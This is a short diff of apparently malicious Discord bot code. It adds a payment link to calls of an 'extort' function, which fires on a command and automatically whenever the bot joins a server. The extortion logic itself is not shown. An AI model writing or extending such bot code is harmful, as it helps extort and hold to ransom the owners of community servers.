@@ -35,7 +35,7 @@ async def restore_command(ctx):
 @bot.command(name='extort')
 async def extort_command(ctx):
     if b_extort:
-        await extort(ctx.channel.guild)
+        await extort(ctx.channel.guild, payment_link)
     else:
         await ctx.send('no')
 
@@ -56,7 +56,7 @@ async def on_message(message):
 @bot.event
 async def on_guild_join(guild):
     if b_extort:
-        await extort(guild)
+        await extort(guild, payment_link)
 
 
 if __name__ == '__main__':
